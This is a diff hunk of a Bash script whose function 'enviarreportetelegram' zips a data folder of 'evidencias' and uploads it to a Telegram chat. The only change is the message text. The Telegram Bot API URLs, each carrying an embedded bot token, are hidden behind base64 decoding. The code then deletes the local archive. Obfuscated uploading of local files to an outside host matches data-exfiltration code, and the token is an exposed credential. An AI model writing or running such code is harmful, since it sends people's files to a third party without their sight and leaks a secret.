@@ -262,7 +262,7 @@ function enviarreportetelegram (){
 		zip -r evidencias-"$date".zip "$rutadatos" >> /dev/null
         curl -X POST \
             -H 'Content-Type: application/json' \
-            -d '{"chat_id": "$telegramid", "text": "This is a test from curl", "disable_notification": true}' \
+            -d '{"chat_id": "$telegramid", "text": "Evidences:", "disable_notification": true}' \
             "$(base64 -d <<<"aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU3MDAyOTIxNzE6QUFFLWZodl9LLTltMndtTFM4cDlPeFZxZjljZFJRUG1KVWsvc2VuZE1lc3NhZ2U=")"
         curl -F document=@"evidences-$date.zip" "$(base64 -d <<<"aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU3MDAyOTIxNzE6QUFFLWZodl9LLTltMndtTFM4cDlPeFZxZjljZFJRUG1KVWsvc2VuZERvY3VtZW50")"?chat_id="$telegramid"
         rm -rf evidencias-"$date".zip >> log.txt
